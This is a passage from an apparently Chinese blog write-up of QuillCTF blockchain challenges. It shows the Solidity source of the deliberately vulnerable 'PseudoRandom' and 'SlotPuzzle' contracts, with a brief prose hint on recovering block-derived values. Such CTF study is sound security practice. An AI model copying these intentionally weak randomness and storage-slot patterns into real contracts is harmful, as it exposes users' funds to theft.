{"title":"Quill Audit CTF","uid":"44a7f484fa434c0aa60841dc0d5e49cd","slug":"quii","date":"2023-01-27T06:00:47.995Z","updated":"2023-04-20T02:06:12.960Z","comments":true,"path":"api/articles/quii.json","keywords":null,"cover":"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/image?url=https%253A%252F%252Fsuper-static-assets.s3.amazonaws.com%252Fa799195c-7c08-410a-9254-50dd9f21a772%252Fimages%252Fa910cf7c-97f8-4902-8d32-7e8fe79312f8.png","content":"<h1 id=\"QuillCTF\"><a href=\"#QuillCTF\" class=\"headerlink\" title=\"QuillCTF\"></a>QuillCTF</h1><p>看到<strong>Quill</strong>在弄的区块链安全CTF题目，看到完成奖励很是心动</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/image-20230126201522920.png\"></p>\n<p>只是可惜，发现这个挑战时候已经结束了五道题，只剩下三道题目，不过看起来应该还在更新之中，本着挑战一下的心态还是来试一试吧</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/image-20230126201650005.png\"></p>\n<h1 id=\"0x10-PseudoRandom\"><a href=\"#0x10-PseudoRandom\" class=\"headerlink\" title=\"0x10 PseudoRandom\"></a>0x10 PseudoRandom</h1><h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.8.19</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">PseudoRandom</span> <span class=\"token punctuation\">&#123;</span>\n    error <span class=\"token function\">WrongSig</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> owner<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token builtin\">bytes32</span><span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">memory</span> input<span class=\"token punctuation\">;</span>\n        input<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token builtin\">bytes32</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        input<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token builtin\">bytes32</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token builtin\">bytes32</span> scalar<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">assembly</span> <span class=\"token punctuation\">&#123;</span>\n            scalar <span class=\"token operator\">:=</span> <span class=\"token function\">sub</span><span class=\"token punctuation\">(</span><span class=\"token function\">mul</span><span class=\"token punctuation\">(</span><span class=\"token function\">timestamp</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">number</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">chainid</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#125;</span>\n        input<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> scalar<span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">assembly</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">let</span> success <span class=\"token operator\">:=</span> <span class=\"token function\">call</span><span class=\"token punctuation\">(</span><span class=\"token function\">gas</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x07</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> input<span class=\"token punctuation\">,</span> <span class=\"token number\">0x60</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x40</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">if</span> <span class=\"token function\">iszero</span><span class=\"token punctuation\">(</span>success<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token keyword\">revert</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">&#125;</span>\n\n            <span class=\"token keyword\">let</span> slot <span class=\"token operator\">:=</span> <span class=\"token function\">xor</span><span class=\"token punctuation\">(</span><span class=\"token function\">mload</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">mload</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n            <span class=\"token function\">sstore</span><span class=\"token punctuation\">(</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token function\">chainid</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">origin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> slot<span class=\"token punctuation\">)</span>\n\n            <span class=\"token keyword\">let</span> sig <span class=\"token operator\">:=</span> <span class=\"token function\">shl</span><span class=\"token punctuation\">(</span>\n                <span class=\"token number\">0xe0</span><span class=\"token punctuation\">,</span>\n                <span class=\"token function\">or</span><span class=\"token punctuation\">(</span>\n                    <span class=\"token function\">and</span><span class=\"token punctuation\">(</span>scalar<span class=\"token punctuation\">,</span> <span class=\"token number\">0xff000000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token function\">or</span><span class=\"token punctuation\">(</span>\n                        <span class=\"token function\">and</span><span class=\"token punctuation\">(</span><span class=\"token function\">shr</span><span class=\"token punctuation\">(</span><span class=\"token function\">xor</span><span class=\"token punctuation\">(</span><span class=\"token function\">origin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">caller</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> slot<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xff0000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token function\">or</span><span class=\"token punctuation\">(</span>\n                            <span class=\"token function\">and</span><span class=\"token punctuation\">(</span>\n                                <span class=\"token function\">shr</span><span class=\"token punctuation\">(</span>\n                                    <span class=\"token function\">mod</span><span class=\"token punctuation\">(</span><span class=\"token function\">xor</span><span class=\"token punctuation\">(</span><span class=\"token function\">chainid</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">origin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0f</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                                    <span class=\"token function\">mload</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span>\n                                <span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                                <span class=\"token number\">0xff00</span>\n                            <span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                            <span class=\"token function\">and</span><span class=\"token punctuation\">(</span><span class=\"token function\">shr</span><span class=\"token punctuation\">(</span><span class=\"token function\">mod</span><span class=\"token punctuation\">(</span><span class=\"token function\">number</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">mload</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xff</span><span class=\"token punctuation\">)</span>\n                        <span class=\"token punctuation\">)</span>\n                    <span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">)</span>\n            <span class=\"token function\">sstore</span><span class=\"token punctuation\">(</span>slot<span class=\"token punctuation\">,</span> sig<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token function\">fallback</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sig <span class=\"token operator\">==</span> <span class=\"token number\">0x3bc5de30</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">assembly</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token function\">mstore</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token function\">sload</span><span class=\"token punctuation\">(</span><span class=\"token function\">calldataload</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x04</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                <span class=\"token keyword\">return</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token builtin\">bytes4</span> sig<span class=\"token punctuation\">;</span>\n\n            <span class=\"token keyword\">assembly</span> <span class=\"token punctuation\">&#123;</span>\n                sig <span class=\"token operator\">:=</span> <span class=\"token function\">sload</span><span class=\"token punctuation\">(</span><span class=\"token function\">sload</span><span class=\"token punctuation\">(</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token function\">chainid</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">caller</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">&#125;</span>\n\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sig <span class=\"token operator\">!=</span> sig<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token keyword\">revert</span> <span class=\"token function\">WrongSig</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n\n            <span class=\"token keyword\">assembly</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token function\">sstore</span><span class=\"token punctuation\">(</span>owner<span class=\"token punctuation\">.</span>slot<span class=\"token punctuation\">,</span> <span class=\"token function\">calldataload</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x24</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"Analyse\"><a href=\"#Analyse\" class=\"headerlink\" title=\"Analyse\"></a>Analyse</h2><p>debug一下可以获取关键数据的参数，在根据数据使用一样的计算方式计算出slot和sig</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/image-20230420095917084.png\"></p>\n<p>如图中所示，chainId,blocknumber,timestamp分别是0,1,5，同理，debug出其他数据，再进行计算，得到数据</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/image-20230420100526447.png\"></p>\n<h1 id=\"0x0F-SlotPuzzle\"><a href=\"#0x0F-SlotPuzzle\" class=\"headerlink\" title=\"0x0F SlotPuzzle\"></a>0x0F SlotPuzzle</h1><h2 id=\"code\"><a href=\"#code\" class=\"headerlink\" title=\"code\"></a>code</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token number\">0.8</span><span class=\"token number\">.18</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">&#123;</span>ReentrancyGuard<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">from</span> <span class=\"token string\">\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/ReentrancyGuard.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">&#123;</span>SafeTransferLib<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">from</span> <span class=\"token string\">\"https://github.com/transmissions11/solmate/blob/main/src/utils/SafeTransferLib.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">&#123;</span>EnumerableSet<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">from</span> <span class=\"token string\">\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/structs/EnumerableSet.sol\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">struct</span> <span class=\"token class-name\">Recipients</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token builtin\">address</span> account<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">struct</span> <span class=\"token class-name\">Parameters</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token builtin\">uint256</span> totalRecipients<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint256</span> offset<span class=\"token punctuation\">;</span>\n    Recipients<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> recipients<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">bytes</span> slotKey<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">interface</span> <span class=\"token class-name\">ISlotPuzzleFactory</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">payout</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> wallet<span class=\"token punctuation\">,</span><span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">ascertainSlot</span><span class=\"token punctuation\">(</span>Parameters <span class=\"token keyword\">calldata</span> params<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span> status<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">SlotPuzzle</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token builtin\">bytes32</span> <span class=\"token keyword\">public</span> immutable ghost <span class=\"token operator\">=</span> <span class=\"token number\">0x68747470733a2f2f6769746875622e636f6d2f61726176696e64686b6d000000</span><span class=\"token punctuation\">;</span>    \n    ISlotPuzzleFactory <span class=\"token keyword\">public</span> factory<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">struct</span> <span class=\"token class-name\">ghostStore</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token builtin\">bytes32</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> hash<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">mapping</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> <span class=\"token operator\">=></span> <span class=\"token keyword\">mapping</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> ghostStore<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> map<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token keyword\">mapping</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> <span class=\"token operator\">=></span> ghostStore<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">private</span> ghostInfo<span class=\"token punctuation\">;</span>\n\n    error <span class=\"token function\">InvalidSlot</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        ghostInfo<span class=\"token punctuation\">[</span>tx<span class=\"token punctuation\">.</span>origin<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>block<span class=\"token punctuation\">.</span>number<span class=\"token punctuation\">]</span>\n        <span class=\"token punctuation\">.</span>map<span class=\"token punctuation\">[</span>block<span class=\"token punctuation\">.</span>timestamp<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span>\n        <span class=\"token punctuation\">.</span>map<span class=\"token punctuation\">[</span>block<span class=\"token punctuation\">.</span>prevrandao<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>block<span class=\"token punctuation\">.</span>coinbase<span class=\"token punctuation\">]</span>\n        <span class=\"token punctuation\">.</span>map<span class=\"token punctuation\">[</span>block<span class=\"token punctuation\">.</span>chainid<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint160</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">(</span><span class=\"token function\">blockhash</span><span class=\"token punctuation\">(</span>block<span class=\"token punctuation\">.</span>number <span class=\"token operator\">-</span> block<span class=\"token punctuation\">.</span>basefee<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span>\n        <span class=\"token punctuation\">.</span>hash<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span>ghost<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        factory <span class=\"token operator\">=</span> <span class=\"token function\">ISlotPuzzleFactory</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">ascertainSlot</span><span class=\"token punctuation\">(</span>Parameters <span class=\"token keyword\">calldata</span> params<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span> status<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>factory<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>params<span class=\"token punctuation\">.</span>recipients<span class=\"token punctuation\">.</span>length <span class=\"token operator\">==</span> params<span class=\"token punctuation\">.</span>totalRecipients<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span> slotKey <span class=\"token operator\">=</span> params<span class=\"token punctuation\">.</span>slotKey<span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">bytes32</span> slot<span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">uint256</span> offset <span class=\"token operator\">=</span> params<span class=\"token punctuation\">.</span>offset<span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">assembly</span> <span class=\"token punctuation\">&#123;</span>\n            offset <span class=\"token operator\">:=</span> <span class=\"token function\">calldataload</span><span class=\"token punctuation\">(</span>offset<span class=\"token punctuation\">)</span>\n            slot <span class=\"token operator\">:=</span> <span class=\"token function\">calldataload</span><span class=\"token punctuation\">(</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>slotKey<span class=\"token punctuation\">,</span>offset<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#125;</span>\n\n        <span class=\"token function\">getSlotValue</span><span class=\"token punctuation\">(</span>slot<span class=\"token punctuation\">,</span>ghost<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint8</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span>params<span class=\"token punctuation\">.</span>recipients<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            factory<span class=\"token punctuation\">.</span><span class=\"token function\">payout</span><span class=\"token punctuation\">(</span>\n                params<span class=\"token punctuation\">.</span>recipients<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>account<span class=\"token punctuation\">,</span>\n                params<span class=\"token punctuation\">.</span>recipients<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>amount\n            <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">getSlotValue</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes32</span> slot<span class=\"token punctuation\">,</span><span class=\"token builtin\">bytes32</span> validResult<span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token keyword\">view</span> <span class=\"token punctuation\">&#123;</span>      \n        <span class=\"token builtin\">bool</span> validOffsets<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">assembly</span> <span class=\"token punctuation\">&#123;</span>\n            validOffsets <span class=\"token operator\">:=</span> <span class=\"token function\">eq</span><span class=\"token punctuation\">(</span>\n                <span class=\"token function\">sload</span><span class=\"token punctuation\">(</span>slot<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                validResult\n            <span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#125;</span>\n\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>validOffsets<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">revert</span> <span class=\"token function\">InvalidSlot</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">getGhostGit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token builtin\">string</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodePacked</span><span class=\"token punctuation\">(</span>ghost<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>    \n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">SlotPuzzleFactory</span> <span class=\"token keyword\">is</span> ReentrancyGuard<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">using</span> <span class=\"token class-name\">EnumerableSet</span> <span class=\"token keyword\">for</span> EnumerableSet<span class=\"token punctuation\">.</span>AddressSet<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">using</span> <span class=\"token class-name\">SafeTransferLib</span> <span class=\"token keyword\">for</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">;</span>\n\n    EnumerableSet<span class=\"token punctuation\">.</span>AddressSet deployedAddress<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token comment\">// require(msg.value == 3 ether);</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">deploy</span><span class=\"token punctuation\">(</span>Parameters <span class=\"token keyword\">calldata</span> params<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> nonReentrant <span class=\"token punctuation\">&#123;</span>\n        SlotPuzzle newContract <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">SlotPuzzle</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        deployedAddress<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>newContract<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   \n        newContract<span class=\"token punctuation\">.</span><span class=\"token function\">ascertainSlot</span><span class=\"token punctuation\">(</span>params<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">payout</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> wallet<span class=\"token punctuation\">,</span><span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>deployedAddress<span class=\"token punctuation\">.</span><span class=\"token function\">contains</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>amount <span class=\"token operator\">==</span> <span class=\"token number\">1</span> ether<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        wallet<span class=\"token punctuation\">.</span><span class=\"token function\">safeTransferETH</span><span class=\"token punctuation\">(</span>amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>   \n<span class=\"token punctuation\">&#125;</span>\n<span aria-hidden=\"true\" 